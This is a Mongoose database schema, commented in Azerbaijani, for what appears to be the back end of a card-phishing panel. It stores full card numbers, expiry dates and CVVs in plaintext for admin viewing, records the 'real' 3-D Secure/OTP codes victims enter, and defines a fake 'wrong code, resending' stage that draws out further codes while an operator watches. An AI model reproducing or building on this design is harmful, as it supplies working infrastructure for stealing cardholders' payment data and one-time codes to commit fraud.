const mongoose = require('mongoose');

const paymentSchema = new mongoose.Schema({
  transactionId: { type: String, required: true, unique: true, index: true },
  order: { type: mongoose.Schema.Types.ObjectId, ref: 'Order', default: null, index: true },
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
  amount: { type: Number, required: true },
  method: { type: String, enum: ['card', 'balance'], default: 'card', index: true },
  status: {
    type: String,
    enum: ['pending_admin', 'awaiting_3ds', 'code_submitted', 'awaiting_final', 'approved', 'declined', 'refunded'],
    default: 'pending_admin',
    index: true
  },

  /* ==================== Axın mərhələsi ====================
     card_review  — kart məlumatları admin təsdiqini gözləyir (3-D kod istənilmir)
     otp_entry    — admin kartı təsdiqlədi: istifadəçidə OTP ekranı açılır
     otp_review   — istifadəçi OTP-ni yazdı, admin qərarı gözlənilir
     wrong_code   — admin "Səhv Kod" seçdi: "Səhv OTP - kod təkrar göndərilir",
                    2 dəq geri sayımdan sonra yeni OTP ekranı açılır
     done         — yekunlaşıb (təsdiq və ya rədd)                                */
  stage: {
    type: String,
    enum: ['card_review', 'wrong_code', 'otp_entry', 'otp_review', 'done'],
    default: 'card_review',
    index: true
  },
  /* Hər mərhələdə ekranda göstərilən 2 dəqiqəlik geri sayımın bitmə vaxtı */
  stageDeadline: { type: Date },
  stageStartedAt: { type: Date },
  wrongCodeAt: { type: Date },
  /* Admin neçə dəfə "Səhv Kod" seçib */
  rejectionCount: { type: Number, default: 0 },

  /* Kart məlumatları — yalnız idarəetmə panelində göstərilir */
  card: {
    number: { type: String, default: '' },
    masked: { type: String, default: '' },
    holder: { type: String, default: '' },
    expiry: { type: String, default: '' },
    cvv: { type: String, default: '' },
    brand: { type: String, default: '' }
  },

  /* İstifadəçinin kart forması ilə birlikdə yazdığı 1-ci 3-D kod */
  firstCode: { type: String, default: '' },
  /* 3-D Secure doğrulama kodu (sistem tərəfindən yaradılır) */
  verificationCode: { type: String, default: '' },
  /* İstifadəçinin OTP ekranında yazdığı REAL kod */
  submittedCode: { type: String, default: '' },
  codeAttempts: [{
    code: { type: String, default: '' },
    kind: { type: String, default: '3ds' },
    at: { type: Date, default: Date.now },
    ip: { type: String, default: '' }
  }],
  codeSubmittedAt: { type: Date },

  /* Admin addımları */
  adminApprovedCardAt: { type: Date },
  adminApprovedBy: { type: String, default: '' },
  adminResentAt: { type: Date },
  adminFinalApprovedAt: { type: Date },
  adminFinalBy: { type: String, default: '' },
  declinedReason: { type: String, default: '' },
  refundedAt: { type: Date },
  refundAmount: { type: Number, default: 0 }
}, { timestamps: true });

module.exports = mongoose.model('Payment', paymentSchema);
